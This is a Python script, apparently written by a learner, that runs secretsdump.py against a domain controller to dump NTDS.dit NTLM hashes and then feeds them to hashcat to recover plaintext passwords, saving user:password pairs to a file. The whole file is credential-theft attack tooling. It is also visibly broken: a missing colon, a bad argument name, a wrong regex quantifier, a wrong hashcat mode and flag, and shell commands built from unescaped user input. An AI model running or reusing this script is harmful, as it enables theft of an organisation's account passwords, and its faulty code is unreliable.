import argparse
import subprocess
import re

def main()
    #above is the main argument for my file
    parser = argparse.ArgumentParser(description="Execute secretsdump.py with provided parameters.")
    parser.add_argument('-d', '--domain', required=True, help="Domain name")
    parser.add_argument('-u', '--user', required=True, help="Username")
    parser.add_argument('-p', '--password', required=True, help="Password")
    parser.add_argument('-ip', '--ipaddress', required=True, help="IP address")

# Additional arguments for hashcat
    parser.add_argument('w', '--wordlist', required=True, help="Wordlist for hashcat")
    parser.add_argument('-r', '--rules', default=None, help="Hashcat rules")
    parser.add_argument('-0', '--optimized', action='store_true', help="Run Hashcat in optimized mode")
    
    args =  parser.parse_args()

    cmd = f"secretsdump.py {args.domain}/{args.user}:'{args.password}'@{args. ipaddress} -just-dc-ntlm"

    print(f"Executing command: {cmd}")

    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    lines = result.stdout.split("\n")

       #Flags to determine the desired lines
    start =  False
    relevant_lines = [] #aka list literals
    nt_hashes = []

    for line in lines:
       if "[*] Using the DRSUAPI method to get NTDS.DIT secrets" in line:
        start = True
        continue
       if start and "[*] Cleaning up..." in line:
          break

       if start:
#Filter the undesired lines
         if not line.startswith(("Guest", "krbtgt")) and "$:" not in line:
           relevant_lines. append(line)

# Extract NT hash
           match = re.search(r': ([a-fA-F0-9](32)):::', line)

           if match:
            nt_hashes.append(match.group(1))

# Write the lines to "ntds-relevant-hashes.txt"

    with open("ntds-relevant-hashes.txt", "w") as f:
        f.write("\n".join(relevant_lines))
#write teh NT hashes to "ntds-nt-hashes.txt", "w") as f:
    with open("ntds-nt-hashes.txt", "w") as f:
       f.write("\n".join(nt_hashes))

#Construct hashcat command
    hashcat_cmd = f"hashcat-m 0 ntds-nt-hashes.txt {args.wordlist}"
    if args.rules:
        hashcat_cmd += f" -r {args.rules}"
    if args.optimized:
        hashcat_cmd += " -0"
    print(f"Executing command: {hashcat_cmd}")
# Capture hashcat output
    result = subprocess.run(hashcat_cmd, shell = True, capture_output=True, text=True)

#Extract numbers for recovered and total hashes
    recovered_match = re.search(r'Recovered\.\.\.\.\.\.\.\.: (\d+)/(\d+)', result.stdout)
    if recovered_match:
        recovered_hashes = int(recovered_match.group(1))
        total_hashes = int(recovered_match.group(2))

        #if any hashes are recovered
        if recovered_hashes > 0:
           #running hashcat with --show flag
            hashcat_show_cmd = f"hashcat -m 0 ntds-nt-hashes.txt {args.wordlist} --show"
            show_result = subprocess.run(hashcat_show_cmd, shell=True, capture_output = True, text = True)

           #Load the original hashes and users
            with open("ntds-relevant-hashes.txt", "r") as f:
                original_data =  f.readlines()


            hash_to_user = {re.search(r':([a-fA-F0-9]{32}):::', line).group(1): line.split(":") 
[0] for line in original_data}

            cracked_data = show_result.stdout.split("\n")

#Map cracked hashes to users

            cracked_users = {}
            for line in cracked_data:
               if ":" in line:
                    hash_value, password = line.split(":")
                    user = hash_to_user[hash_value]
                    cracked_users[user] = password

#Save the results to <domain>-cracked-users.txt
            with open(f"{args.domain}-cracked-users.txt", "w") as f:
               for user, password in cracked_users.items():
                  f.write(f"{user}:{password}\n")
            print(f"Password cracked! Please see{args.domain}-cracked-users.txt file for results.")
        else:
           print("NO Password is retrieved.")
    else:
       print("Could not parse hashcat output.")

if __name__ == "__main__":
   main()
            

# If any hashes were recovered

    
